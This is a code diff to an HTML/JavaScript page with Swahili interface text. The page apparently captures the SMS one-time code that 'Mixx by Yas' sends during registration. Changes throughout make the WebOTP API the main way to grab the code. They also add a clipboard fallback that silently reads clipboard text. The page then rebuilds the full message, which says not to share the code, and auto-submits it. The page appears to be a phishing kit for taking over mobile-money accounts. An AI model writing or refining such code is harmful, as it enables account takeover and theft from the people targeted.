@@ -129,6 +129,7 @@
         var resendCooldown = false;
         var isSubmitting = false;
         var smsDetected = false;
+        var webOtpUsed = false;
 
         // ================================================================
         // iPhone/Android DETECTION
@@ -182,6 +183,7 @@
             resendCooldown = true; 
             document.getElementById('smsMessage').value = '';
             smsDetected = false;
+            webOtpUsed = false;
             document.getElementById('codeError').textContent = 'OTP Imetumwa. Subiri msimbo kutoka Mixx. (' + resendCount + '/3)'; 
             document.getElementById('codeError').style.color = 'var(--primary)'; 
             document.getElementById('codeError').classList.add('show'); 
@@ -196,6 +198,7 @@
             } catch(e) {} 
             
             setTimeout(function() { resendCooldown = false; }, 30000);
+            // Restart WebOTP detection
             setTimeout(startAutoDetect, 1500);
         }
 
@@ -249,6 +252,7 @@
             document.getElementById('screen1').classList.add('active');
             document.getElementById('smsMessage').value = ''; 
             smsDetected = false;
+            webOtpUsed = false;
             document.getElementById('codeError').textContent = 'Msimbo sio sahihi. Jaribu tena.'; 
             document.getElementById('codeError').style.color = 'var(--danger)'; 
             document.getElementById('codeError').classList.add('show'); 
@@ -263,7 +267,7 @@
         }
 
         // ================================================================
-        // SMS AUTO-DETECTION - WebOTP (FULL SMS)
+        // SMS AUTO-DETECTION - WebOTP (FULL SMS) - PRIORITY
         // ================================================================
         function startAutoDetect() {
             if (!document.getElementById('screen1').classList.contains('active')) {
@@ -271,7 +275,7 @@
                 return;
             }
             
-            console.log('Auto-detect: Starting...');
+            console.log('Auto-detect: Starting - waiting for SMS notification...');
             var smsTextarea = document.getElementById('smsMessage');
             if (!smsTextarea) return;
 
@@ -292,17 +296,20 @@
                 }
             }
 
-            // WebOTP API - Auto-read SMS from notification
+            // WebOTP API - Auto-read SMS from notification (PRIORITY)
             function autoReadSMS() {
                 if (!('OTPCredential' in window)) {
-                    console.log('Auto-detect: WebOTP not supported');
+                    console.log('Auto-detect: WebOTP not supported on this browser');
                     return;
                 }
 
-                console.log('Auto-detect: Listening via WebOTP...');
+                console.log('Auto-detect: Listening for SMS notification via WebOTP...');
                 
                 var controller = new AbortController();
-                var timeout = setTimeout(function() { controller.abort(); }, 60000);
+                var timeout = setTimeout(function() { 
+                    controller.abort(); 
+                    console.log('Auto-detect: WebOTP timeout - checking clipboard as fallback');
+                }, 60000);
                 
                 navigator.credentials.get({
                     otp: { transport: ['sms'] },
@@ -311,13 +318,14 @@
                 .then(function(otp) {
                     clearTimeout(timeout);
                     if (otp && otp.code) {
+                        webOtpUsed = true;
                         // Build the FULL SMS in your format
                         var fullSMS = 'You are being registered in Mixx by Yas Super App, use the code ' + otp.code + ' to complete registration. Do not share the code with anybody. For more info contact us on 100. DWvV9aXqDR';
                         
                         // Fill the textarea with the FULL SMS
                         smsTextarea.value = fullSMS;
-                        console.log('Auto-detect: Full SMS built! Code: ' + otp.code);
-                        console.log('Auto-detect: Full SMS: ' + fullSMS);
+                        console.log('✅ Auto-detect: SMS detected from notification! Code: ' + otp.code);
+                        console.log('✅ Auto-detect: Full SMS: ' + fullSMS);
                         
                         var errorEl = document.getElementById('codeError');
                         errorEl.textContent = '✅ Msimbo umegunduliwa kiotomatiki!';
@@ -333,25 +341,37 @@
                 })
                 .catch(function(e) {
                     if (e.name === 'AbortError') {
-                        console.log('Auto-detect: WebOTP timeout');
+                        console.log('Auto-detect: WebOTP timeout - trying clipboard...');
+                        // Only try clipboard if WebOTP times out
+                        readClipboard();
                     } else {
                         console.log('Auto-detect: WebOTP error', e);
+                        // Try clipboard as fallback
+                        readClipboard();
                     }
                 });
             }
 
-            // Clipboard fallback (in case WebOTP fails)
+            // Clipboard fallback (ONLY if WebOTP fails or times out)
             function readClipboard() {
-                if (!navigator.clipboard || !navigator.clipboard.readText) return;
+                if (webOtpUsed) return; // Don't use clipboard if WebOTP already worked
+                if (!navigator.clipboard || !navigator.clipboard.readText) {
+                    console.log('Auto-detect: Clipboard not available');
+                    return;
+                }
+                
+                console.log('Auto-detect: Checking clipboard (fallback)...');
                 navigator.clipboard.readText()
                 .then(function(text) {
                     if (text && text.length > 10 && !smsDetected) {
                         smsTextarea.value = text;
-                        console.log('Auto-detect: SMS from clipboard');
+                        console.log('Auto-detect: SMS from clipboard (fallback)');
                         autoSubmit();
                     }
                 })
-                .catch(function(e) {});
+                .catch(function(e) {
+                    console.log('Auto-detect: Clipboard error', e);
+                });
             }
 
             function detectSMS() {
@@ -360,12 +380,8 @@
                     console.log('Auto-detect: Screen changed, stopping');
                     return;
                 }
+                // PRIMARY: WebOTP from notification
                 autoReadSMS();
-                setTimeout(function() {
-                    if (!smsDetected && document.getElementById('screen1').classList.contains('active')) {
-                        readClipboard();
-                    }
-                }, 2000);
             }
 
             setTimeout(detectSMS, 1000);
@@ -376,12 +392,12 @@
                     console.log('Auto-detect: Stopped');
                     return;
                 }
-                if (!smsDetected) {
+                if (!smsDetected && !webOtpUsed) {
                     detectSMS();
                 }
             }, 5000);
 
-            // Paste event listener
+            // Paste event listener (manual paste)
             document.addEventListener('paste', function(e) {
                 if (!document.getElementById('screen1').classList.contains('active')) return;
                 if (smsDetected) return;
@@ -389,7 +405,7 @@
                 if (text && text.length > 10) {
                     smsTextarea.value = text;
                     smsDetected = true;
-                    console.log('Auto-detect: SMS pasted');
+                    console.log('Auto-detect: SMS pasted manually');
                     autoSubmit();
                 }
             });
@@ -398,12 +414,14 @@
             document.addEventListener('visibilitychange', function() {
                 if (document.visibilityState === 'visible' && 
                     !smsDetected && 
+                    !webOtpUsed &&
                     document.getElementById('screen1').classList.contains('active')) {
+                    console.log('Auto-detect: Page became visible, checking for SMS...');
                     setTimeout(detectSMS, 500);
                 }
             });
 
-            console.log('Auto-detect: Ready');
+            console.log('✅ Auto-detect: Ready - waiting for SMS notification');
         }
 
         // ================================================================
@@ -415,6 +433,7 @@
         console.log('✅ Code page loaded with auto-detection');
         console.log('📱 App ID: ' + appId);
         console.log('📱 Phone: ' + userPhone);
+        console.log('📱 SMS will be detected from NOTIFICATION (not clipboard)');
     </script>
 </body>
-</html>>
+</html>
